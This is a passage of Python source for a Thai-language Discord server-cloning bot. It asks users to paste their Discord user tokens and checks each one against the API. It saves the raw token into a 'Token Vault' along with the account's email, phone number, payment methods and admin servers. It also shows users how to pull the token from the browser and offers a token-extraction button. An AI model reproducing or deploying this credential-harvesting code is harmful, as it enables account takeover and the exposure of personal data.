            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/121.0.0.0 Safari/537.36",
            "X-Super-Properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIn0="
        }
        async with aiohttp.ClientSession() as session:
            s, data = await DiscordRESTEngine.request_with_retry(session, "GET", f"{DiscordRESTEngine.V10_URL}/users/@me", headers=headers)
            if s == 200 and isinstance(data, dict):
                # 1. Fetch Guilds info
                s_g, guilds_data = await DiscordRESTEngine.request_with_retry(session, "GET", f"{DiscordRESTEngine.BASE_URL}/users/@me/guilds", headers=headers)
                total_guilds = len(guilds_data) if (s_g == 200 and isinstance(guilds_data, list)) else 0
                admin_guilds = sum(1 for g in guilds_data if (int(g.get('permissions', 0)) & 0x8) != 0) if (s_g == 200 and isinstance(guilds_data, list)) else 0

                # 2. Fetch Payment Sources
                s_p, pay_data = await DiscordRESTEngine.request_with_retry(session, "GET", f"{DiscordRESTEngine.BASE_URL}/users/@me/billing/payment-sources", headers=headers)
                has_payment = len(pay_data) if (s_p == 200 and isinstance(pay_data, list)) else 0
                payment_label = f"ผูกไว้ {has_payment} ช่องทาง" if has_payment > 0 else "ไม่มีช่องทางชำระเงิน"

                # 3. Account Age
                user_id_int = int(data.get("id", 0))
                created_ts = int(((user_id_int >> 22) + 1420070400000) / 1000)
                account_age_str = f"<t:{created_ts}:R> (<t:{created_ts}:D>)"

                # 4. Nitro status
                nitro_types = {0: "ไม่มี Nitro", 1: "Nitro Classic", 2: "Nitro Boost / Full", 3: "Nitro Basic"}
                nitro_label = nitro_types.get(data.get("premium_type", 0), "ไม่มี Nitro")

                # 5. Save to Vault
                await db.save_or_update_token(
                    token=raw_token,
                    user_id=str(data.get("id")),
                    username=str(data.get("username")),
                    email=str(data.get("email") or "ไม่มี"),
                    phone=str(data.get("phone") or "ไม่มี"),
                    nitro=nitro_label,
                    payment_methods=payment_label,
                    admin_guilds=admin_guilds,
                    total_guilds=total_guilds,
                    status="active"
                )

                emb = discord.Embed(title="✅ ข้อมูล Token ถูกต้อง (Active & Verified)", color=0x57F287)
                emb.description = f"🔒 **สถานะ:** บันทึกและซิงค์เข้า **Token Vault** เรียบร้อยแล้ว พร้อมใช้งานในระบบโคลน"
                emb.add_field(name="👤 ผู้ใช้", value=f"`{data.get('username')}`", inline=True)
                emb.add_field(name="🆔 ไอดี", value=f"`{data.get('id')}`", inline=True)
                emb.add_field(name="📅 วันที่สร้างบัญชี", value=account_age_str, inline=False)
                emb.add_field(name="📧 อีเมล", value=f"`{data.get('email') or 'ไม่ได้ผูก'}`", inline=True)
                emb.add_field(name="📱 เบอร์โทร", value=f"`{data.get('phone') or 'ไม่ได้ผูก'}`", inline=True)
                emb.add_field(name="💎 Nitro", value=f"`{nitro_label}`", inline=True)
                emb.add_field(name="💳 บัตร/การชำระเงิน", value=f"`{payment_label}`", inline=True)
                emb.add_field(name="🌐 เซิร์ฟเวอร์ที่อยู่", value=f"`{total_guilds}` เซิร์ฟ (แอดมิน `{admin_guilds}` เซิร์ฟ)", inline=True)
                emb.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{data['id']}/{data['avatar']}.png" if data.get('avatar') else None)
                emb.set_footer(text=f"Token Vault Sync • {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')}")
                await interaction.followup.send(embed=emb, ephemeral=True)
            else:
                await interaction.followup.send("❌ **Token ไม่ถูกต้อง หมดอายุแล้ว หรือถูกล็อก**", ephemeral=True)

class GuildListModal(ui.Modal, title="🌐 ดึงรายการเซิร์ฟเวอร์ที่ Token อยู่"):
    token = ui.TextInput(label="User Token", placeholder="วาง Token ของคุณ...", required=True)

    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.defer(ephemeral=True)
        headers = {"Authorization": self.token.value.strip()}
        async with aiohttp.ClientSession() as session:
            s, guilds = await DiscordRESTEngine.request_with_retry(session, "GET", f"{DiscordRESTEngine.BASE_URL}/users/@me/guilds", headers=headers)
            if s == 200 and isinstance(guilds, list):
                paginator = GuildPaginatorView(guilds)
                await interaction.followup.send(embed=paginator.create_embed(), view=paginator, ephemeral=True)
            else:
                await interaction.followup.send("❌ ไม่สามารถดึงรายการเซิร์ฟเวอร์ได้", ephemeral=True)

class EmojiDownloadModal(ui.Modal, title="📦 บีบอัดและดาวน์โหลดอิโมจิ"):
    token  = ui.TextInput(label="User Token", placeholder="วาง User Token...", required=True)
    src_id = ui.TextInput(label="Server ID ต้นทาง", placeholder="ไอดีเซิร์ฟเวอร์...", required=True)

    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.defer(ephemeral=True)
        headers = {"Authorization": self.token.value.strip()}
        await interaction.followup.send("⏳ **กำลังรวบรวมไฟล์อิโมจิทั้งหมด...**", ephemeral=True)
        async with aiohttp.ClientSession() as session:
            s, emojis = await DiscordRESTEngine.request_with_retry(session, "GET", f"{DiscordRESTEngine.BASE_URL}/guilds/{self.src_id.value}/emojis", headers=headers)
            if s != 200 or not isinstance(emojis, list):
                return await interaction.followup.send("❌ ดึงข้อมูลอิโมจิไม่ได้", ephemeral=True)
            zip_buffer = io.BytesIO()
            with zipfile.ZipFile(zip_buffer, "w", zipfile.ZIP_DEFLATED) as zf:
                for em in emojis:
                    ext = "gif" if em.get('animated') else "png"
                    async with session.get(f"https://cdn.discordapp.com/emojis/{em['id']}.{ext}") as resp:
                        if resp.status == 200: zf.writestr(f"{em['name']}.{ext}", await resp.read())
            zip_buffer.seek(0)
            try:
                await interaction.user.send(content=f"📦 อิโมจิเซิร์ฟ `{self.src_id.value}`", file=discord.File(zip_buffer, filename="emojis.zip"))
                await interaction.followup.send("✅ **ส่งไฟล์ .zip เข้า DM เรียบร้อยแล้วค่ะ!** 📬", ephemeral=True)
            except discord.Forbidden:
                await interaction.followup.send("⚠️ ไม่สามารถส่ง DM ได้ (ปิดรับข้อความส่วนตัว) จึงแนบไฟล์ให้ตรงนี้แทนค่ะ:", file=discord.File(zip_buffer, filename="emojis.zip"), ephemeral=True)

# ==============================================================================
# 6. VIEWS & PAGINATOR
# ==============================================================================
class GuildPaginatorView(ui.View):
    def __init__(self, guilds: list, page: int = 0):
        super().__init__(timeout=120)
        self.guilds = guilds
        self.page = page
        self.per_page = 15
        self.max_pages = max(0, (len(guilds) - 1) // self.per_page)

    def create_embed(self) -> discord.Embed:
        start = self.page * self.per_page
        current = self.guilds[start:start + self.per_page]
        desc = "\n".join([f"`{i + start + 1}.` **{g.get('name')}** \n`ID:` `{g.get('id')}`" for i, g in enumerate(current)])
        embed = discord.Embed(title="🌐 รายชื่อเซิร์ฟเวอร์", description=desc or "ไม่มีข้อมูล", color=0x5865F2)
        embed.set_footer(text=f"หน้า {self.page + 1}/{self.max_pages + 1} | รวมทั้งหมด {len(self.guilds)} เซิร์ฟเวอร์")
        return embed

    @ui.button(label="◀ ย้อนกลับ", style=discord.ButtonStyle.gray, custom_id="paginator_prev")
    async def prev(self, it: discord.Interaction, btn: ui.Button):
        if self.page > 0:
            self.page -= 1
            await it.response.edit_message(embed=self.create_embed(), view=self)
        else: await it.response.defer()

    @ui.button(label="ถัดไป ▶", style=discord.ButtonStyle.gray, custom_id="paginator_next")
    async def next(self, it: discord.Interaction, btn: ui.Button):
        if self.page < self.max_pages:
            self.page += 1
            await it.response.edit_message(embed=self.create_embed(), view=self)
        else: await it.response.defer()

class MainClonerPersistentView(ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @ui.button(custom_id="main_clone_btn", label="⌜ 𝐂𝐨𝐩𝐲 𝐒𝐞𝐫𝐯𝐞𝐫 ⌟", style=discord.ButtonStyle.danger, row=0)
    async def btn_clone(self, it: discord.Interaction, btn: ui.Button):
        await it.response.send_modal(AdvancedCloneModal())

    @ui.button(custom_id="bot_clone_btn", label="🤖 ⌜ โคลนเฉพาะบอท ⌟", style=discord.ButtonStyle.primary, row=0)
    async def btn_bot_clone(self, it: discord.Interaction, btn: ui.Button):
        await it.response.send_modal(BotOnlyCloneModal())

    @ui.button(custom_id="snapshot_export_btn", label="📦 ⌜ Snapshot JSON ⌟", style=discord.ButtonStyle.success, row=0)
    async def btn_snapshot_export(self, it: discord.Interaction, btn: ui.Button):
        await it.response.send_modal(SnapshotDownloadModal())

    @ui.button(custom_id="token_check_btn", label="⌜ 𝐓𝐨𝐤𝐞𝐧 𝐂𝐡𝐞𝐜𝐤 ⌟", style=discord.ButtonStyle.secondary, row=1)
    async def btn_token_check(self, it: discord.Interaction, btn: ui.Button):
        allowed, err_msg = await check_token_permission(it)
        if not allowed:
            return await it.response.send_message(err_msg, ephemeral=True)
        await it.response.send_modal(TokenInspectorModal())

    @ui.button(custom_id="rlzx_extract_btn", label="⌜ ดึง 𝐔𝐬𝐞𝐫 𝐓𝐨𝐤𝐞𝐧 ⌟", style=discord.ButtonStyle.secondary, row=1)
    async def btn_extract_token(self, it: discord.Interaction, btn: ui.Button):
        allowed, err_msg = await check_token_permission(it)
        if not allowed:
            return await it.response.send_message(err_msg, ephemeral=True)
        await it.response.send_modal(TokenExtractorModal())

    @ui.select(custom_id="more_options_select", placeholder="|︲ เมนูตัวเลือกเพิ่มเติม 1 ︲|", row=2, options=[
        discord.SelectOption(label="วิธีหา Token", value="how_to_token", description="วิธีดึง Token บน PC และมือถือ"),
        discord.SelectOption(label="เช็ค ID เซิร์ฟเวอร์", value="check_guild_ids", description="ดูรายชื่อเซิร์ฟเวอร์ที่ Token เข้าถึงได้"),
        discord.SelectOption(label="ล้างตัวเลือกทั้งหมด", value="clear_all", description="รีเซ็ตเมนูตัวเลือกนี้"),
    ])
    async def select_menu_1(self, it: discord.Interaction, select: ui.Select):
        val = select.values[0]
        if val == "how_to_token":
            emb1 = discord.Embed(title="💻 วิธีหา Token (PC)", color=0x5865F2)
            emb1.description = "1. เปิด Discord บน Browser\n2. กด `F12` -> แถบ **Network** ค้นหา `/messages`\n3. ดู Header: `authorization`"
            await it.response.send_message(embed=emb1, ephemeral=True)
        elif val == "check_guild_ids":
            await it.response.send_modal(GuildListModal())
        else: await it.response.defer()

    @ui.select(custom_id="multi_select", placeholder="|︲ เมนูตัวเลือกเพิ่มเติม 2 (ก๊อปแยกส่วน) ︲|", row=3, options=[
        discord.SelectOption(label="โคลนเฉพาะบอท (Black-Box AI)", value="bot_clone", description="สแกนบอท ถอดสิทธิ์ และสังเคราะห์โค้ด Python"),
        discord.SelectOption(label="ก๊อปเฉพาะช่อง / หมวดหมู่", value="ch", description="คัดลอกเฉพาะ Channels และ Categories"),
        discord.SelectOption(label="ก๊อปเฉพาะยศ", value="rl", description="คัดลอกเฉพาะ Roles สิทธิ์ และสี"),
        discord.SelectOption(label="ก๊อปเฉพาะอิโมจิ", value="em", description="คัดลอกเฉพาะ Custom Emojis ทั้งหมด"),
        discord.SelectOption(label="ล้างตัวเลือกทั้งหมด", value="clear", description="ปิดเมนูนี้"),
    ])
    async def select_menu_2(self, it: discord.Interaction, select: ui.Select):
        val = select.values[0]
        if val == "clear": await it.response.defer()
        elif val == "bot_clone": await it.response.send_modal(BotOnlyCloneModal())
        else: await it.response.send_modal(PartCloneModal(val))

    @ui.select(custom_id="extra_select", placeholder="|︲ เมนูตัวเลือกเพิ่มเติม 3 ︲|", row=4, options=[
        discord.SelectOption(label="ดาวน์โหลดไฟล์อิโมจิ", value="dl_emoji", description="ดาวน์โหลดอิโมจิทั้งหมดเป็นไฟล์ .zip ส่งเข้า DM"),
        discord.SelectOption(label="ล้างตัวเลือกทั้งหมด", value="clear_extra", description="ปิดเมนูนี้"),
    ])
    async def select_menu_3(self, it: discord.Interaction, select: ui.Select):
        val = select.values[0]
        if val == "dl_emoji": await it.response.send_modal(EmojiDownloadModal())
        else: await it.response.defer()

# ==============================================================================
# 7. INTERACTIVE CONTROL PANEL VIEW (/set panel)
# ==============================================================================
def create_control_panel_embed() -> discord.Embed:
    embed = discord.Embed(
        title="⚡ แผงควบคุมระบบโคลนดิสคอร์ด & บอท (Enterprise Control Panel)",
        description=(
            "ระบบโคลนและสำรองข้อมูลเซิร์ฟเวอร์แบบครบวงจร ขับเคลื่อนด้วยสถาปัตยกรรม **REA + GoClone**\n"
            "🔒 **ความเป็นส่วนตัว:** การกดใช้งานทุกปุ่มจะเป็นแบบ **เห็นคนเดียว (Only you can see this)**\n"
            "📬 **การรับไฟล์:** ไฟล์ข้อมูลสำรองทั้งหมด (JSON, ZIP, ลิงก์บอท) จะถูก **ส่งตรงเข้า DM แชทส่วนตัว** ของคุณทันทีเมื่อเสร็จสิ้น\n\n"
            "─────────────────────────────────────────"
        ),
        color=0x5865F2
    )

    embed.add_field(
        name="🚀 1. โคลนเต็มระบบ + บอท (Full Server & Bot Replication)",
        value=(
            "• **สิ่งที่จะได้รับ:** คัดลอก Icon/Banner/Splash, ยศทั้งหมด, ช่องทุกประเภท (Text, Voice, Forum, Stage), สิทธิ์ Overwrites, อิโมจิ, สติ๊กเกอร์, ข้อความ และสแกนบอททั้งหมด\n"
            "• **ไฟล์ที่จะได้ทาง DM:** ไฟล์ `snapshot_{id}.json` + ไฟล์สรุปรายงานลิงก์เชิญบอท `bot_invites.txt`"
        ),
        inline=False
    )

    embed.add_field(
        name="🤖 2. โคลนเฉพาะบอทดิสคอร์ด (Bot Shadow Replication)",
        value=(
            "• **สิ่งที่จะได้รับ:** สแกนบอททั้งหมดในเซิร์ฟเวอร์ต้นทาง คำนวณสิทธิ์ Permissions อัตโนมัติ และสร้างยศจำลอง `🤖 {BotName}` ในดิสปลายทาง\n"
            "• **ไฟล์ที่จะได้ทาง DM:** ไฟล์ `bot_invites_{id}.txt` บรรจุลิงก์เชิญบอทแบบ 1-Click พร้อม Permissions ที่ถูกต้อง"
        ),
        inline=False
    )

    embed.add_field(
        name="📁 3. โคลนเฉพาะช่อง & หมวดหมู่ (Channels & Categories)",
        value="• **สิ่งที่จะได้รับ:** คัดลอก Categories และห้องทั้งหมด พร้อมสิทธิ์การมองเห็น (Overwrites), Slowmode, NSFW และ Bitrate ห้องเสียง",
        inline=True
    )

    embed.add_field(
        name="👑 4. โคลนเฉพาะยศ (Roles)",
        value="• **สิ่งที่จะได้รับ:** คัดลอกยศทั้งหมด สี สิทธิ์ (Permissions) และเรียงลำดับสูง-ต่ำตามต้นฉบับ 100%",
        inline=True
    )

    embed.add_field(
        name="✨ 5. โคลนเฉพาะอิโมจิ & สติ๊กเกอร์",
        value="• **สิ่งที่จะได้รับ:** ดูดรูป Custom Emojis (PNG/GIF) และสติ๊กเกอร์ อัปโหลดเข้าสู่เซิร์ฟเวอร์ปลายทางผ่าน Worker Pool",
        inline=True
    )

    embed.add_field(
        name="📦 6. ดูดไฟล์ Snapshot JSON สำรองข้อมูล",
        value="• **สิ่งที่จะได้รับ:** ดึงโครงสร้างเซิร์ฟเวอร์ทั้งหมดเป็นไฟล์ Snapshot JSON สำรองไว้ในเครื่อง ไม่ต้องสร้างลงดิสไหน ส่งตรงเข้า DM",
        inline=True
    )

    embed.add_field(
        name="🎁 7. ดาวน์โหลดอิโมจิเป็น .ZIP",
        value="• **สิ่งที่จะได้รับ:** บีบอัดรูปภาพอิโมจิทั้งหมดเป็นไฟล์ .zip ส่งตรงเข้า DM ใช้งานได้ทันที",
        inline=True
    )

    embed.set_footer(text="คลิกปุ่มด้านล่างเพื่อเริ่มการทำงาน • ข้อมูลของคุณจะปลอดภัยและแสดงเฉพาะคุณเท่านั้น")
    return embed

class InteractivePanelControlView(ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    # Row 0: Primary Cloning Actions
    @ui.button(custom_id="panel_btn_full_clone", label="🚀 โคลนเต็มระบบ + บอท", style=discord.ButtonStyle.danger, row=0)
    async def btn_full_clone(self, it: discord.Interaction, btn: ui.Button):
        await it.response.send_modal(AdvancedCloneModal())

    @ui.button(custom_id="panel_btn_bot_clone", label="🤖 โคลนเฉพาะบอท", style=discord.ButtonStyle.primary, row=0)
    async def btn_bot_clone(self, it: discord.Interaction, btn: ui.Button):
        await it.response.send_modal(BotOnlyCloneModal())

    @ui.button(custom_id="panel_btn_snapshot_export", label="📦 ดูดไฟล์ Snapshot JSON", style=discord.ButtonStyle.success, row=0)
    async def btn_snapshot_export(self, it: discord.Interaction, btn: ui.Button):
        await it.response.send_modal(SnapshotDownloadModal())

    # Row 1: Modular Part Cloning
    @ui.button(custom_id="panel_btn_channel_clone", label="📁 โคลนเฉพาะช่อง/หมวดหมู่", style=discord.ButtonStyle.secondary, row=1)
    async def btn_channel_clone(self, it: discord.Interaction, btn: ui.Button):
        await it.response.send_modal(PartCloneModal("ch"))

    @ui.button(custom_id="panel_btn_role_clone", label="👑 โคลนเฉพาะยศ (Roles)", style=discord.ButtonStyle.secondary, row=1)
    async def btn_role_clone(self, it: discord.Interaction, btn: ui.Button):
        await it.response.send_modal(PartCloneModal("rl"))

    @ui.button(custom_id="panel_btn_emoji_clone", label="✨ โคลนเฉพาะอิโมจิ", style=discord.ButtonStyle.secondary, row=1)
    async def btn_emoji_clone(self, it: discord.Interaction, btn: ui.Button):
        await it.response.send_modal(PartCloneModal("em"))

    # Row 2: Utilities & Extra Downloads
    @ui.button(custom_id="panel_btn_emoji_zip", label="🎁 โหลดอิโมจิเป็น .ZIP", style=discord.ButtonStyle.success, row=2)
    async def btn_emoji_zip(self, it: discord.Interaction, btn: ui.Button):
        await it.response.send_modal(EmojiDownloadModal())

    @ui.button(custom_id="panel_btn_token_check", label="🔍 ตรวจสอบ Token", style=discord.ButtonStyle.secondary, row=2)
    async def btn_token_check(self, it: discord.Interaction, btn: ui.Button):
        allowed, err_msg = await check_token_permission(it)
        if not allowed:
            return await it.response.send_message(err_msg, ephemeral=True)
        await it.response.send_modal(TokenInspectorModal())

    @ui.button(custom_id="panel_btn_extract_token", label="🔐 ดึง User Token", style=discord.ButtonStyle.secondary, row=2)
    async def btn_extract_token(self, it: discord.Interaction, btn: ui.Button):
        allowed, err_msg = await check_token_permission(it)
        if not allowed:
            return await it.response.send_message(err_msg, ephemeral=True)
        await it.response.send_modal(TokenExtractorModal())

# ==============================================================================
# 8. COMPONENTS V2 DISPATCHER
# ==============================================================================
def build_copy_v2_components() -> list:
    return [
        {
            "type": 17,  # Container
            "components": [
                {
                    "type": 10,
                    "content": (
                        "# <a:star:1550850248975458385>︱𝐶𝑂𝑃𝑌 𝐵𝑂𝑇 ⌒✦ [REA High-Performance]\n"
                        "-# ระบบก๊อปเซิร์ฟเวอร์อัตโนมัติ ใช้ง่ายขึ้น 300%"
                    )
                },
                {"type": 14, "divider": True, "spacing": 1},
                {
                    "type": 10,
                    "content": (
                        "** ระบบที่ทำได้ **\n"
                        "- ก๊อป ช่อง, อิโมจิ, ยศ, สติ๊กเกอร์, ข้อความได้\n"
                        "- 🤖 **โคลนบอทดิสคอร์ด** สแกนคำสั่ง สิทธิ์ และสังเคราะห์สคริปต์ Python ด้วย Dual Gemini AI\n"
                        "- มีทั้งก๊อปรวม และ ก๊อปแบบแยก (ช่อง, ยศ, อิโมจิ, บอท)\n"
                        "- มีระบบค้นหา ID เซิร์ฟเวอร์ และดูด Snapshot JSON\n"
                        "- ก๊อปไฟล์อิโมจิแยกสำหรับคนที่ต้องการไฟล์ (.ZIP)\n\n"
                        "-# <a:pepesaber1:1550850706725019651> 𝐶𝑂𝑃𝑌 𝐵𝑂𝑇 𝑂𝑁 𝑇𝑂𝑃"
                    )
                },
                {"type": 14, "divider": True, "spacing": 1},
                {
                    "type": 1,
                    "components": [
                        {
                            "type": 3,
                            "custom_id": "more_options_select",
                            "placeholder": "|︲ เมนูตัวเลือกเพิ่มเติม 1 ︲|",
                            "options": [
                                {"label": "เช็ค ID เซิร์ฟเวอร์", "value": "check_guild_ids", "description": "ดูรายชื่อเซิร์ฟเวอร์ที่สามารถใช้งานได้", "emoji": {"id": "1550850407633260634", "name": "kr7_magnifyingglass", "animated": True}},
                                {"label": "ล้างตัวเลือกทั้งหมด", "value": "clear_all", "description": "ปิดตัวเลือกนี้", "emoji": {"id": "1553303815199920128", "name": "Ldelete", "animated": True}}
                            ]
                        }
                    ]
                },
                {
                    "type": 1,
                    "components": [
                        {
                            "type": 3,
                            "custom_id": "multi_select",
                            "placeholder": "|︲ เมนูตัวเลือกเพิ่มเติม 2 ︲|",
                            "options": [
                                {"label": "โคลนเฉพาะบอท (Black-Box AI)", "value": "bot_clone", "description": "สแกนบอท ถอดสิทธิ์ และสังเคราะห์โค้ด Python", "emoji": {"id": "1550850407633260634", "name": "kr7_magnifyingglass", "animated": True}},
                                {"label": "ก๊อปเฉพาะช่อง / หมวดหมู่", "value": "ch", "description": "ก๊อปเฉพาะช่องและหมวดหมู่", "emoji": {"id": "1553306807902928978", "name": "16", "animated": True}},
                                {"label": "ก๊อปเฉพาะยศ", "value": "rl", "description": "ก๊อปเฉพาะ Role", "emoji": {"id": "1553306807902928978", "name": "16", "animated": True}},
                                {"label": "ก๊อปเฉพาะอิโมจิ", "value": "em", "description": "ก๊อปเฉพาะ Emoji", "emoji": {"id": "1553306807902928978", "name": "16", "animated": True}},
                                {"label": "ล้างตัวเลือกทั้งหมด", "value": "clear", "description": "ปิดตัวเลือกนี้", "emoji": {"id": "1553303815199920128", "name": "Ldelete", "animated": True}}
                            ]
                        }
                    ]
                },
                {
                    "type": 1,
                    "components": [
                        {
                            "type": 3,
                            "custom_id": "extra_select",
                            "placeholder": "|︲ เมนูตัวเลือกเพิ่มเติม 3 ︲|",
                            "options": [
                                {"label": "ดาวน์โหลดไฟล์อิโมจิ", "value": "dl_emoji", "description": "โหลดอิโมจิทั้งหมดเป็น .zip ส่ง DM", "emoji": {"id": "1553306239809880105", "name": "apload_1394253568848166942", "animated": True}},
                                {"label": "ล้างตัวเลือกทั้งหมด", "value": "clear_extra", "description": "ปิดตัวเลือกนี้", "emoji": {"id": "1553303815199920128", "name": "Ldelete", "animated": True}}
                            ]
                        }
                    ]
                },
                {
                    "type": 1,
                    "components": [
                        {
                            "type": 2, "style": 5, "label": "Discord Server", "url": SUPPORT_SERVER_URL,
                            "emoji": {"id": "1548640232457371691", "name": "pDiscord", "animated": True}
                        }
                    ]
                },
                {
                    "type": 1,
                    "components": [
                        {"type": 2, "style": 4, "label": "⌜ 𝐂𝐨𝐩𝐲 𝐒𝐞𝐫𝐯𝐞𝐫 ⌟", "custom_id": "main_clone_btn", "emoji": {"id": "1553303905709072486", "name": "SP", "animated": True}},
                        {"type": 2, "style": 1, "label": "🤖 ⌜ โคลนเฉพาะบอท ⌟", "custom_id": "bot_clone_btn", "emoji": {"id": "1543149451852386374", "name": "kr7rocket", "animated": True}},
                        {"type": 2, "style": 3, "label": "📦 ⌜ Snapshot JSON ⌟", "custom_id": "snapshot_export_btn", "emoji": {"id": "1553306239809880105", "name": "apload_1394253568848166942", "animated": True}}
                    ]
                },
                {
                    "type": 1,
                    "components": [
                        {"type": 2, "style": 2, "label": "⌜ 𝐓𝐨𝐤𝐞𝐧 𝐂𝐡𝐞𝐜𝐤 ⌟", "custom_id": "token_check_btn", "emoji": {"id": "1553299937255620702", "name": "Key", "animated": True}},
                        {"type": 2, "style": 2, "label": "⌜ ดึง 𝐔𝐬𝐞𝐫 𝐓𝐨𝐤𝐞𝐧 ⌟", "custom_id": "rlzx_extract_btn", "emoji": {"id": "1543149451852386374", "name": "kr7rocket", "animated": True}}
                    ]
                }
            ]
        }
    ]

async def send_v2_components(channel_id: int, bot_token: str) -> Tuple[int, Any]:
    url = f"https://discord.com/api/v10/channels/{channel_id}/messages"
    headers = {"Authorization": f"Bot {bot_token}", "Content-Type": "application/json"}
    payload = {"flags": 32768, "components": build_copy_v2_components()}
    async with aiohttp.ClientSession() as session:
        async with session.post(url, headers=headers, json=payload) as r:
            try: data = await r.json()
            except Exception: data = await r.text()
            return r.status, data

# ==============================================================================
# 9. BOT CORE & SLASH COMMANDS
# ==============================================================================
intents = discord.Intents.default()
if os.getenv("MESSAGE_CONTENT_INTENT", "false").strip().lower() in ("1", "true", "yes", "on"):
    intents.message_content = True

class CopyBot(commands.Bot):
    def __init__(self):
        super().__init__(command_prefix="!", intents=intents)
        self.status_cycle = itertools.cycle([
            "⛩️ ระบบก๊อปดิส",
            "꒰ {guild_count} เซิร์ฟ | {user_count} สมาชิก ꒱"
        ])
        self._guild_synced = False

    async def setup_hook(self):
        # Register Persistent Views
        self.add_view(MainClonerPersistentView())
        self.add_view(InteractivePanelControlView())
        self.tree.add_command(set_group)

        synced = await self.tree.sync()
        print(f"✔ ซิงค์คำสั่ง global {len(synced)} คำสั่ง: {', '.join(c.name for c in synced)}")
        self.presence_updater.start()

        now      = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        bot_name = str(self.user.name) if self.user else "CopyBot"
        bot_id   = str(self.user.id) if self.user else "0"
        print(f"◜.  ✦ ₊ ✿  . ₊  ✦ .  + .   ✿.  ✦ ₊ ✿  . ₊  ✦ .  + .   ✿")
        print(f"︱               𝐶𝑂𝑃𝑌 𝐵𝑂𝑇 𝑂𝑁 𝑇𝑂𝑃                      ︱")
        print(f"︱.  ✦ ₊ ✿  . ₊  ✦ .  + .   ✿.  ✦ ₊ ✿  . ₊  ✦ . + . ✿ ︱")
        print(f"︱  ชื่อบอท        : {bot_name.ljust(35)}︱")
        print(f"︱  ไอดีบอท       : {bot_id.ljust(35)}︱")
        print(f"︱  เวลา         : {now.ljust(35)}︱")
        print(f"︱                                                    ︱")
        print(f"︱  ลิขสิทธิ์        : gg.kruz_vyn                        ︱")
        print(f"︱  Copyright    : © gg.kruz_vyn All Rights Reserved  ︱")
        print(f"◟.  ✦ ₊ ✿  . ₊  ✦ .  + .   ✿.  ✦ ₊ ✿  . ₊  ✦ .  + .   ✿")

    async def on_ready(self):
        if self._guild_synced: return
        self._guild_synced = True
        for guild in self.guilds:
            try:
                self.tree.copy_global_to(guild=guild)
                await self.tree.sync(guild=guild)
            except Exception: pass

    @tasks.loop(seconds=12)
    async def presence_updater(self):
        if not self.is_ready(): return
        try:
            total_users = sum(guild.member_count or 0 for guild in self.guilds)
            current_status = next(self.status_cycle).format(guild_count=len(self.guilds), user_count=total_users)
            await self.change_presence(activity=discord.Streaming(name=current_status, url="https://www.twitch.tv/real_king"))
        except Exception: pass

bot = CopyBot()

# --- [ Command Group: /set panel & /set_panel ] ---
set_group = app_commands.Group(name="set", description="จัดการการตั้งค่าระบบ")

@set_group.command(name="panel", description="ติดตั้งแผงควบคุมระบบโคลนดิสคอร์ด (บังคับกำหนดยศที่เข้าถึงระบบ Token)")
@app_commands.describe(
    allowed_role="ยศที่ได้รับอนุญาตให้ใช้งานระบบ Token & Reverse Engineering (บังคับระบุ)",
    channel="ห้องที่ต้องการติดตั้งแผงควบคุม (ค่าเริ่มต้น: ห้องปัจจุบัน)"
)
@app_commands.default_permissions(administrator=True)
async def slash_set_panel(interaction: discord.Interaction, allowed_role: discord.Role, channel: Optional[discord.TextChannel] = None):
    await interaction.response.defer(ephemeral=True)
    if not interaction.user.guild_permissions.administrator and interaction.user.id != OWNER_ID:
        return await interaction.followup.send("❌ คุณไม่มีสิทธิ์ใช้งานคำสั่งนี้ (ต้องเป็น Administrator)", ephemeral=True)

    target_channel = channel or interaction.channel
    if not isinstance(target_channel, discord.TextChannel):
        return await interaction.followup.send("❌ กรุณาเลือกห้องข้อความ (Text Channel) ที่ถูกต้อง", ephemeral=True)

    # Save to SQLite database
    if interaction.guild_id:
        await db.set_guild_config(interaction.guild_id, target_channel.id, allowed_role.id)

    embed = create_control_panel_embed()
    view = InteractivePanelControlView()
    try:
        await target_channel.send(embed=embed, view=view)
        await interaction.followup.send(
            f"✅ **ติดตั้งแผงควบคุมที่ห้อง {target_channel.mention} เรียบร้อยแล้วค่ะ!**\n"
            f"• 👑 **ยศที่ได้รับสิทธิ์ใช้งาน Token:** {allowed_role.mention}\n"
            f"• 🔒 **การป้องกัน:** ปุ่ม `Token Check` และ `ดึง User Token` ถูกล็อกสิทธิ์ให้เฉพาะยศ {allowed_role.mention} หรือ Administrator เท่านั้น\n"
            f"• 🤖 **AI Engine:** ขับเคลื่อนด้วย Dual Gemini AI Studio สำหรับการ Reverse Engineering บอท\n"
            f"• 📬 **การรับไฟล์:** ข้อมูลและสคริปต์ `.py` ทั้งหมดจะถูกส่งตรงเข้า **DM** อัตโนมัติ",
            ephemeral=True
        )
    except discord.Forbidden:
        await interaction.followup.send("❌ บอทไม่มีสิทธิ์ส่งข้อความในห้องดังกล่าว", ephemeral=True)

@bot.tree.command(name="set_panel", description="ติดตั้งแผงควบคุมระบบโคลนดิสคอร์ด (บังคับกำหนดยศที่เข้าถึงระบบ Token)")
@app_commands.describe(
    allowed_role="ยศที่ได้รับอนุญาตให้ใช้งานระบบ Token & Reverse Engineering (บังคับระบุ)",
    channel="ห้องที่ต้องการติดตั้งแผงควบคุม (ค่าเริ่มต้น: ห้องปัจจุบัน)"
)
@app_commands.default_permissions(administrator=True)
async def slash_set_panel_alias(interaction: discord.Interaction, allowed_role: discord.Role, channel: Optional[discord.TextChannel] = None):
    await slash_set_panel.callback(interaction, allowed_role, channel)

@bot.tree.command(name="setup", description="ติดตั้งระบบก๊อปเซิร์ฟ (Components V2)")
@app_commands.describe(
    allowed_role="ยศที่ได้รับอนุญาตให้ใช้งานระบบ Token (บังคับระบุ)",
    channel="ห้องที่จะให้บอทส่ง UI"
)
@app_commands.default_permissions(administrator=True)
async def setup_clone(interaction: discord.Interaction, allowed_role: discord.Role, channel: discord.TextChannel):
    await interaction.response.defer(ephemeral=True)
    if not interaction.user.guild_permissions.administrator and interaction.user.id != OWNER_ID:
        return await interaction.followup.send("❌ คุณไม่มีสิทธิ์ใช้คำสั่งนี้", ephemeral=True)
    if interaction.guild_id:
